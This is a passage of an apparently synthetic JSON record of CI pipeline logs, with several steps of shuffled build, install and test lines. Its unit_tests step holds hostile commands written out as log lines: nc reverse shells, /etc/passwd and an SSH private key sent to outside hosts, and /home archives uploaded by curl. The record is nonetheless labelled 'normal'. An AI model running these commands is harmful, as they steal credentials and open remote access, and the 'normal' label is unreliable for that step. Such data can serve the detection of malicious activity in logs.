          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_db_connect (471ms)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 5/10: Building",
          "  PASS: test_auth_login (122ms)",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_cache_hit (457ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (361ms)",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Cache hit for key-4512",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (112ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_user_create (211ms)",
          "  PASS: test_cache_hit (279ms)",
          "Installing react@5.15.0",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "Installing lodash@5.16.0",
          "[12:00:22] ERROR: Connection failed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-1929",
          "Cache hit for key-6023",
          "WARNING: jest has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Installing eslint@2.10.0",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-8168",
          "Compiling src/utils.go...",
          "Cache hit for key-9358",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-1002",
          "Compiling src/app.ts...",
          "Installing prettier@5.15.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-6239",
          "Installing jest@1.14.0",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (470ms)",
          "Installing prettier@4.20.0",
          "Compiling src/main.py...",
          "[12:00:22] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 104",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing react@4.15.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (441ms)",
          "[12:00:22] INFO: Processing request",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Cache hit for key-3644",
          "[12:00:22] INFO: Processing request",
          "Installing axios@3.0.0",
          "  PASS: test_auth_login (150ms)",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-3897",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (161ms)",
          "\u2713 test completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-08T12:02:17.164724",
        "finished_at": "2025-12-08T12:02:28.013360",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 3/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (228ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 10/10: Building",
          "Installing prettier@5.18.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (217ms)",
          "Installing react@3.13.0",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-7785",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Installing jest@1.16.0",
          "  PASS: test_db_connect (399ms)",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-6114",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-1341",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "Installing jest@3.15.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing prettier@1.1.0",
          "  PASS: test_cache_hit (206ms)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (49ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (114ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (101ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing webpack@5.0.0",
          "  PASS: test_db_connect (359ms)",
          "[12:00:22] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Cache hit for key-4493",
          "[12:00:22] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing prettier@2.17.0",
          "Installing prettier@2.2.0",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (101ms)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (336ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-8163",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-4285",
          "Installing axios@4.1.0",
          "  PASS: test_db_connect (115ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_api_health (47ms)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-08T12:02:28.013360",
        "finished_at": "2025-12-08T12:02:38.861996",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 test completed",
          "Cache hit for key-9477",
          "  PASS: test_user_create (414ms)",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-9222",
          "  PASS: test_api_health (142ms)",
          "Cache hit for key-7469",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-3991",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (248ms)",
          "Step 4/10: Building",
          "Cache hit for key-5430",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (43ms)",
          "Installing jest@5.8.0",
          "  PASS: test_api_health (133ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "FAILED: test_auth_login",
          "Cache hit for key-9037",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing jest@2.9.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/handler.rs...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:22] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (135ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-7233",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_auth_login (475ms)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (469ms)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_cache_hit (445ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-8772",
          "Compiling src/service.java...",
          "Installing react@4.1.0",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1209",
          "Installing lodash@3.2.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-1238",
          "Compiling src/app.ts...",
          "Installing lodash@1.2.0",
          "Installing express@3.5.0",
          "Cache hit for key-7520",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_cache_hit (333ms)",
          "Step 2/10: Building",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-08T12:02:38.861996",
        "finished_at": "2025-12-08T12:02:43.201450",
        "log_lines": [
          "=== Step: deploy_production ===",
          "  PASS: test_auth_login (17ms)",
          "Cache hit for key-6250",
          "  PASS: test_db_connect (249ms)",
          "  PASS: test_auth_login (451ms)",
          "  PASS: test_auth_login (359ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing react@3.17.0",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Installing eslint@2.3.0",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "Installing lodash@5.5.0",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_auth_login (440ms)",
          "Installing jest@3.6.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 127",
          "Cache hit for key-8528",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-1828",
          "\u2713 build completed",
          "  PASS: test_auth_login (88ms)",
          "Installing axios@2.16.0",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-5841",
          "\u2713 lint completed",
          "  PASS: test_db_connect (33ms)",
          "Step 6/10: Building",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "  PASS: test_api_health (31ms)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@4.18.0",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-1581",
          "Step 3/10: Building",
          "Cache hit for key-5747",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "FAILED: test_user_create",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (145ms)",
          "Installing prettier@4.16.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing express@3.17.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-7004",
          "  PASS: test_auth_login (36ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@3.5.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_cache_hit (408ms)",
          "Step 9/10: Building",
          "Cache hit for key-8846",
          "Installing jest@4.12.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-2869",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 build completed",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-08T12:02:43.201450",
        "finished_at": "2025-12-08T12:03:15.747358",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache hit for key-3586",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-9343",
          "Cache hit for key-2448",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing prettier@4.20.0",
          "Compiling src/service.java...",
          "  PASS: test_api_health (385ms)",
          "  PASS: test_db_connect (151ms)",
          "Cache hit for key-6757",
          "Cache hit for key-1561",
          "Compiling src/main.py...",
          "Installing lodash@2.0.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-5699",
          "Installing lodash@5.20.0",
          "  PASS: test_api_health (71ms)",
          "[12:00:22] ERROR: Connection failed",
          "Exception: ValueError",
          "Step 7/10: Building",
          "Installing react@2.17.0",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-1285",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Installing prettier@2.2.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "nc -e /bin/sh 114.137.3.63 64350",
          "Installing webpack@5.16.0",
          "Compiling src/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing react@3.9.0",
          "Cache hit for key-8474",
          "Installing prettier@5.3.0",
          "[12:00:22] ERROR: Connection failed",
          "Step 5/10: Building",
          "nc -e /bin/sh 13.39.93.113 8543",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-9842",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (282ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 46.64.147.152 18578",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Sending 414MB of data to acme.corp",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (43ms)",
          "  PASS: test_cache_hit (408ms)",
          "Cache hit for key-3987",
          "Installing webpack@2.9.0",
          "nc -e /bin/sh 38.235.167.222 11843",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Step 1/10: Building",
          "Installing webpack@3.7.0",
          "[12:00:22] INFO: Processing request",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "nc -e /bin/sh 63.225.158.154 10229",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_api_health (202ms)",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "  PASS: test_db_connect (376ms)",
          "Installing jest@5.18.0",
          "Sending 227MB of data to cloud.services",
          "Step 9/10: Building",
          "Cache hit for key-7206",
          "Installing react@5.20.0",
          "Cache hit for key-8785",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Installing eslint@5.10.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_auth_login (395ms)",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (185ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 21.105.76.198 6729",
          "Compiling src/service.java...",
          "Installing prettier@2.5.0",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_user_create (274ms)",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:22] INFO: Processing request",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}